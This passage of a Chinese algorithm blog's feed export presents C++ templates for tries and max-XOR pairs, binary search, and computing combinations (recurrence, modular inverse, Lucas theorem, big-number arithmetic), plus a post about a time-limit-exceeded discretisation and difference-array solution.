class="hljs-type">int</span> cnt[N];<span class="hljs-comment">//存储有几个以该节点为结尾的字符串。</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(string x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> p = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;x.<span class="hljs-built_in">length</span>();i++)<br>    &#123;<br>        <span class="hljs-type">int</span> u = x[i]-<span class="hljs-string">&#x27;0&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(!son[p][u]) son[p][u] = ++idx;<span class="hljs-comment">//如果节点为空，则新建节点。</span><br>        p = son[p][u];<br>    &#125;<br>    cnt[p]++;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">query</span><span class="hljs-params">(string x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> p=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;x.<span class="hljs-built_in">length</span>();i++)<br>    &#123;<br>        <span class="hljs-type">int</span> u=x[i]-<span class="hljs-string">&#x27;0&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(!son[p][u]) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        p = son[p][u];<br>    &#125;<br>    <span class="hljs-keyword">return</span> cnt[p];<br>    <br></code></pre></td></tr></table></figure><p>最大异或对：<br>采用贪心的思想，对于一个数，从最高位找与它相反的位。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> p =<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">30</span>;i&gt;=<span class="hljs-number">0</span>;i--)<br>    &#123;<br>        <span class="hljs-type">int</span> &amp;s = son[p][(x&gt;&gt;i)&amp;<span class="hljs-number">1</span>];<span class="hljs-comment">//对每一位挨个存储。</span><br>        <span class="hljs-keyword">if</span>(!s) s = ++idx;<br>        p = s;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">option</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> res= <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> p =<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">30</span>;i&gt;=<span class="hljs-number">0</span>;i--)<br>    &#123;<br>        <span class="hljs-type">int</span> s = (x&gt;&gt;i)&amp;<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span>(son[p][!s])<span class="hljs-comment">//如果存在相反的位，那么就朝相反的位移动。</span><br>        &#123;<br>            res += <span class="hljs-number">1</span>&lt;&lt;i;<br>            p = son[p][!s];<br>        &#125;<br>        <span class="hljs-keyword">else</span> p = son[p][s];<br>        <br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>二分模版</title>
    <link href="/2022/03/09/%E4%BA%8C%E5%88%86%E6%A8%A1%E6%9D%BF/"/>
    <url>/2022/03/09/%E4%BA%8C%E5%88%86%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<p>一般二分模板</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>   <span class="hljs-type">int</span> l=<span class="hljs-number">0</span>;<br>   <span class="hljs-type">int</span> r =n<span class="hljs-number">-1</span>;<br>   <span class="hljs-keyword">while</span>(l&lt;r)<br>   &#123;<br><span class="hljs-type">int</span> mid = (l+r)&gt;&gt;<span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span>(a[mid]&gt;=x)  r= mid;<br><span class="hljs-keyword">else</span> l =mid+<span class="hljs-number">1</span>;<br>   &#125;<br>   <span class="hljs-keyword">return</span> l;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意：如果能找到等于x的元素，那么返回对应的下标。如果没有找到正好等于x的，回去找第一个&gt;&#x3D;x的元素，若找不到，则返回数组最后一个位置的下标。</p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>求组合数的多种方法</title>
    <link href="/2022/03/05/%E6%B1%82%E7%BB%84%E5%90%88%E6%95%B0%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
    <url>/2022/03/05/%E6%B1%82%E7%BB%84%E5%90%88%E6%95%B0%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h3 id="递推法"><a href="#递推法" class="headerlink" title="递推法"></a>递推法</h3><p>C[a][b] &#x3D; C[a-1][b-1]+C[a-1][b];<br>很好理解，从一堆苹果中拿出一个苹果，那么从这a个苹果中取出b个苹果可根据有无这个苹果分成两种情况，得到递推式。<br>模板题：<a href="https://www.acwing.com/problem/content/887/">https://www.acwing.com/problem/content/887/</a><br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">const</span> <span class="hljs-type">int</span> mod = <span class="hljs-number">1e9</span>+<span class="hljs-number">7</span>;<br><span class="hljs-type">int</span> c[N][N];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">col</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=i;j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(!j) c[i][j]=<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">else</span> c[i][j] = (c[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>]+c[i<span class="hljs-number">-1</span>][j])%mod;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="公式法"><a href="#公式法" class="headerlink" title="公式法"></a>公式法</h3><p>利用组合数公式，求阶乘，再利用快速幂和费马定理求相应的乘法逆元，相乘求得。<br>模板题：<a href="https://www.acwing.com/problem/content/888/">https://www.acwing.com/problem/content/888/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">1e5</span>+<span class="hljs-number">7</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> mod= <span class="hljs-number">1e9</span>+<span class="hljs-number">7</span>;<br><span class="hljs-type">int</span> fact[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">qkm</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> res =<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(b)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(b&amp;<span class="hljs-number">1</span>) res  =(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)res*a%mod;<br>        b&gt;&gt;=<span class="hljs-number">1</span>;<br>        a=(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)a*a%mod;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    fact[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<br>    fact[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;N;i++)<br>    &#123;<br>        fact[i] =(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fact[i<span class="hljs-number">-1</span>]*i %mod;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    <span class="hljs-built_in">init</span>();<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        <span class="hljs-type">int</span> a,b;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);<br>        <span class="hljs-type">int</span> ans = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fact[a]*<span class="hljs-built_in">qkm</span>(fact[a-b],mod<span class="hljs-number">-2</span>)%mod*<span class="hljs-built_in">qkm</span>(fact[b],mod<span class="hljs-number">-2</span>)%mod;<br>        <span class="hljs-keyword">if</span>(a==b) ans =<span class="hljs-number">1</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,ans);<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="卢卡斯定理"><a href="#卢卡斯定理" class="headerlink" title="卢卡斯定理"></a>卢卡斯定理</h3><p>当a,b过大时，利用卢卡斯定理求解。<br>卢卡斯定理</p><p><img src="/upload/2022/05/image-3ab15b1dd1ac48e19e3af5625b149720.png" alt="image.png"></p><p>模板题：<a href="https://www.acwing.com/problem/content/889/">https://www.acwing.com/problem/content/889/</a></p><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">qkm</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> p)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> res =<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(b)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(b&amp;<span class="hljs-number">1</span>) res = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)res*a%p;<br>        b&gt;&gt;=<span class="hljs-number">1</span>;<br>        a=(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)a*a%p;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">C</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> p)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>,j=a;i&lt;=b;i++,j--)<br>    &#123;<br>        res = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)res*j%p;<br>        res = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>) res*<span class="hljs-built_in">qkm</span>(i,p<span class="hljs-number">-2</span>,p)%p;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">lucas</span><span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-type">long</span> a, <span class="hljs-type">long</span> <span class="hljs-type">long</span> b,<span class="hljs-type">int</span> p)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(a&lt;p &amp;&amp; b&lt;p) <span class="hljs-keyword">return</span> <span class="hljs-built_in">C</span>(a,b,p);<br>    <span class="hljs-keyword">else</span> <span class="hljs-built_in">return</span> (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)<span class="hljs-built_in">C</span>(a%p,b%p,p)*<span class="hljs-built_in">lucas</span>(a/p,b/p,p)%p;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> a,b;<br>        <span class="hljs-type">int</span> p;<br>        cin&gt;&gt;a&gt;&gt;b&gt;&gt;p;<br>        cout&lt;&lt;<span class="hljs-built_in">lucas</span>(a,b,p)&lt;&lt;endl;<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高精度"><a href="#高精度" class="headerlink" title="高精度"></a>高精度</h3><p>上面几种方法都求的是对一个大素数取模的值。<br>若要求准确的值则需要用到高精度以及质因数分解。<br><img src="/upload/2022/05/image-27e92f7393294f44a953e994ddb102bd.png" alt="image.png"><br>模板题：<a href="https://www.acwing.com/problem/content/submission/890/">https://www.acwing.com/problem/content/submission/890/</a><br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">5010</span>;<br><span class="hljs-type">int</span> prime[N];<br><span class="hljs-type">bool</span> st[N];<br><span class="hljs-type">int</span> cnt;<br><span class="hljs-type">int</span> sum[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">ol</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=a;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!st[i]) prime[cnt++] =i;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;prime[j]&lt;=a/i;j++)<br>            &#123;<br>                st[prime[j]*i] =<span class="hljs-literal">true</span>;<br>                <span class="hljs-keyword">if</span>(i%prime[j]==<span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>            &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">mul</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;a,<span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> t=<span class="hljs-number">0</span>;<br>    vector&lt;<span class="hljs-type">int</span>&gt;c;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;a.<span class="hljs-built_in">size</span>()||t;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(i&lt;a.<span class="hljs-built_in">size</span>()) t += a[i]*b;<br>        c.<span class="hljs-built_in">push_back</span>(t%<span class="hljs-number">10</span>);<br>        t = t/<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">while</span>(c.<span class="hljs-built_in">size</span>()&gt;<span class="hljs-number">1</span> &amp;&amp; c.<span class="hljs-built_in">back</span>()==<span class="hljs-number">0</span>) c.<span class="hljs-built_in">pop_back</span>();<br>    <span class="hljs-keyword">return</span> c;<br>&#125;<br><span class="hljs-comment">//获取x!中 质因数p的次数</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> p)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> res =<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(x)<br>    &#123;<br>        res+=x/p;<br>        x=x/p;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> a,b;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);<br>    <span class="hljs-built_in">ol</span>(a);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;cnt;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> p =prime[i];<br>        sum[i] = <span class="hljs-built_in">get</span>(a,p)-<span class="hljs-built_in">get</span>(b,p)-<span class="hljs-built_in">get</span>(a-b,p);<span class="hljs-comment">//存储第i个素数的指数。</span><br>    &#125;<br>    vector&lt;<span class="hljs-type">int</span>&gt;res;<br>    res.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;cnt;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;sum[i];j++)<br>        &#123;<br>            res = <span class="hljs-built_in">mul</span>(res,prime[i]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=res.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,res[i]);<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>离散化+差分的坑</title>
    <link href="/2021/04/24/%E7%A6%BB%E6%95%A3%E5%8C%96+%E5%B7%AE%E5%88%86%E7%9A%84%E5%9D%91/"/>
    <url>/2021/04/24/%E7%A6%BB%E6%95%A3%E5%8C%96+%E5%B7%AE%E5%88%86%E7%9A%84%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<p>4月24日，周赛题T4。<br><a href="https://leetcode-cn.com/problems/number-of-flowers-in-full-bloom/">https://leetcode-cn.com/problems/number-of-flowers-in-full-bloom/</a><br>根据题目，想到离散化+差分处理。<br>tle代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> a[<span class="hljs-number">300005</span>];<br>    vector&lt;<span class="hljs-type">int</span>&gt;alls;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-type">int</span> l = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> r = alls.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">while</span>(l&lt;r)<br>        &#123;<br>            <span class="hljs-type">int</span> mid = (l+r)&gt;&gt;<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(alls[mid]&gt;=x) r= mid;<br>            <span class="hljs-keyword">else</span> l = l+<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> l;<br>    &#125;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">fullBloomFlowers</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; flowers, vector&lt;<span class="hljs-type">int</span>&gt;&amp; persons)</span> </span>&#123;<br>        vector&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;add;<br>        <span class="hljs-type">int</span> n =persons.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;flowers.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            <span class="hljs-type">int</span> l = flowers[i][<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> r = flowers[i][<span class="hljs-number">1</span>];<br>            add.<span class="hljs-built_in">push_back</span>(&#123;l,r&#125;);<br>            alls.<span class="hljs-built_in">push_back</span>(l);<br>            alls.<span class="hljs-built_in">push_back</span>(r);<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;persons.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            <span class="hljs-type">int</span> q = persons[i];<br>            alls.<span class="hljs-built_in">push_back</span>(q);<br>        &#125;<br>        <span class="hljs-built_in">sort</span>(alls.<span class="hljs-built_in">begin</span>(),alls.<span class="hljs-built_in">end</span>());<br>        alls.<span class="hljs-built_in">erase</span>(<span class="hljs-built_in">unique</span>(alls.<span class="hljs-built_in">begin</span>(),alls.<span class="hljs-built_in">end</span>()),alls.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-comment">// for(int i=0;i&lt;alls.size();i++)</span><br>        <span class="hljs-comment">// &#123;</span><br>        <span class="hljs-comment">//     cout&lt;&lt;alls[i]&lt;&lt;&quot; &quot;;</span><br>        <span class="hljs-comment">// &#125;</span><br>        <span class="hljs-comment">// cout&lt;&lt;endl;</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;add.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            <span class="hljs-type">int</span> l = <span class="hljs-built_in">find</span>(add[i].first);<br>            <span class="hljs-type">int</span> r =<span class="hljs-built_in">find</span>(add[i].second);<br>            a[l]+=<span class="hljs-number">1</span>;<br>            a[r+<span class="hljs-number">1</span>]-=<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=alls.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            a[i] += a[i<span class="hljs-number">-1</span>];<br>        &#125;<br>        <span class="hljs-comment">// for(int i=0;i&lt;=alls.size();i++)</span><br>        <span class="hljs-comment">// &#123;</span><br>        <span class="hljs-comment">//     cout&lt;&lt;a[i]&lt;&lt;&quot; &quot;;</span><br>        <span class="hljs-comment">// &#125;</span><br>        vector&lt;<span class="hljs-type">int</span>&gt;<span class="hljs-built_in">ans</span>(n);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            ans[i]=a[<span class="hljs-built_in">find</span>(persons[i])];<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br><br>    